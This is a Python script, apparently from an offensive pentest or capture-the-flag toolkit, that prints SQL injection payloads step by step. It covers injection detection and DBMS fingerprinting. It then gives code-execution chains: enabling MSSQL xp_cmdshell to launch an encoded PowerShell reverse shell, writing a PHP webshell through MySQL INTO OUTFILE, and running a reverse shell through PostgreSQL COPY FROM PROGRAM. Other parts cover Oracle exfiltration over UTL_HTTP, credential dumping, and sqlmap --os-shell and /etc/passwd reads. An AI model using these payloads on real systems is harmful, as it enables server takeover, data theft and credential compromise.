#!/usr/bin/env python3
"""SQL INJECTION -> shell/data. Detection, DBMS-specific code-exec, and sqlmap automation. PRINTS payloads.

Usage:
  python3 gen_sqli.py detect                       # detection + identify-the-DBMS payloads
  python3 gen_sqli.py shell --db mssql|mysql|postgres|oracle   # DBMS-specific RCE/webshell path
  python3 gen_sqli.py sqlmap --url '<url with param>'          # automate (incl. --os-shell)
"""
import sys
import _web_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "detect"

if arg == "detect":
    print("# needs: a request parameter (GET/POST/cookie/header) whose value reaches a SQL query.")
    print("# 1) is it injectable? (try in this order — error is fastest to read, time-based is the last-resort blind confirm)")
    print("   '   \"   ')   ')-- -           # (try first) break the query -> error = candidate  -> ok: a SQL/500 error or changed page")
    print("   ' AND 1=1-- -   vs   ' AND 1=2-- -     # boolean diff  -> ok: 1=1 looks normal, 1=2 differs = injectable")
    print("   ' OR SLEEP(5)-- -   |   '; WAITFOR DELAY '0:0:5'-- -    # time-based, MySQL | MSSQL (blind last resort)  -> ok: response hangs ~5s")
    print("# 2) column count + UNION:")
    print("   ' ORDER BY 5-- -                 # bump the number until error = column count  -> ok: 'ORDER BY N' errors, N-1 is the count")
    print("   ' UNION SELECT 1,2,3,4,5-- -     # match the column count from above  -> ok: a number (1..5) appears on the page = reflected column")
    print("# 3) identify the DBMS — put the version fn in a reflected column:")
    print("   @@version (MSSQL/MySQL) · version() (MySQL/Postgres) · banner FROM v$version (Oracle)  -> ok: a version string tells you the DBMS")
    print("# -> then: gen_sqli.py shell --db <mssql|mysql|postgres|oracle>")

elif arg == "shell":
    db = opt("--db", "mssql")
    print(f"# SQLi -> code execution   DBMS={db}")
    print(f"# needs: a STACKED-query or UNION-capable injection point (from `detect`) with a high-priv DB account.")
    print(f"#   replace <REV_B64> with a base64 revshell, /var/www/html with the real web root, page columns to match.")
    if db == "mssql":
        print("# MSSQL — xp_cmdshell (needs: the SQL login is sysadmin/can RECONFIGURE). Privesc Route 1 entry if the acct has SeImpersonate:")
        print("'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;")
        print("  EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -")
        print("'; EXEC master..xp_cmdshell 'powershell -e <REV_B64>';-- -")
        print("# -> ok: your nc catches a SYSTEM/service-acct shell = xp_cmdshell ran.")
        print("# no xp_cmdshell? try (in order): OLE automation (sp_OACreate) -> CLR assembly -> linked-server EXEC.")
        print("# -> once xp_cmdshell runs: this IS winpriv Route 1 (whoami /priv -> SeImpersonate).")
    elif db == "mysql":
        print("# MySQL — write a webshell via INTO OUTFILE (needs: FILE priv + secure_file_priv empty/writable + a KNOWN web root that serves PHP):")
        print(f"' UNION SELECT \"{P.WEBSHELL['php']}\",2,3 INTO OUTFILE '/var/www/html/s.php'-- -")
        print(f"#   then: curl '{P.TURL}/s.php?c=id'  (or ?c=<urlencoded php/bash revshell>)")
        print(f"#   -> ok: the curl returns uid=... = webshell written + executes.")
        print("# also: UDF library exec if you can write to the plugin dir (lib_mysqludf_sys).")
    elif db == "postgres":
        print("# PostgreSQL — COPY ... FROM PROGRAM (needs: Postgres 9.3+ AND a superuser role):")
        print("'; DROP TABLE IF EXISTS x; CREATE TABLE x(o text); COPY x FROM PROGRAM 'id';-- -   # -> ok: table x now holds the id output (SELECT it back)")
        print(f"'; COPY x FROM PROGRAM '{P.revshell_nq()}';-- -   # quote-free: a bash revshell here would close the SQL string  -> ok: your nc catches the shell")
        print("# older / non-superuser: large-object -> write a lib and CREATE FUNCTION (lo_export). Or plpython/plperlu if installed.")
    elif db == "oracle":
        print("# Oracle — RCE is harder (often data-only). Try in order: DBMS_SCHEDULER -> Java stored proc -> UTL_HTTP OOB exfil.")
        print("# read files:  UTL_FILE; exfil via UTL_HTTP to your box.  -> ok: your listener/http.server receives the exfil'd data.")
    else:
        print(f"# unknown --db '{db}' (mssql|mysql|postgres|oracle)"); sys.exit(1)
    print("# if direct exec fails: dump creds (users/passwords tables, hashes) -> crack -> ../network/gen_shell.")

elif arg == "sqlmap":
    u = opt("--url", f"{P.TURL}/page?id=1")
    print(f"# needs: a URL with an injectable param (<url with param>), OR save the raw request to <req.txt> in Burp (auth/POST/cookies).")
    print(f"# run in order — confirm the vuln (--dbs) BEFORE reaching for a shell:")
    print(f"sqlmap -u '{u}' --batch --level 3 --risk 2 --dbs      # (try first) -> ok: sqlmap lists databases = confirmed injectable")
    print(f"sqlmap -u '{u}' --batch --os-shell        # interactive OS shell (auto xp_cmdshell/OUTFILE/COPY)  -> ok: an os-shell> prompt")
    print(f"sqlmap -r <req.txt> --batch --os-shell     # same, from a saved request (POST/cookies/headers)")
    print(f"sqlmap -u '{u}' --batch --file-read=/etc/passwd    # or --sql-shell for a DB shell")
    print(f"# --os-shell auto-detects the DBMS and drops a stager/webshell; then upgrade to a full revshell.")
else:
    print("use: detect | shell --db <dbms> | sqlmap --url <url>"); sys.exit(1)
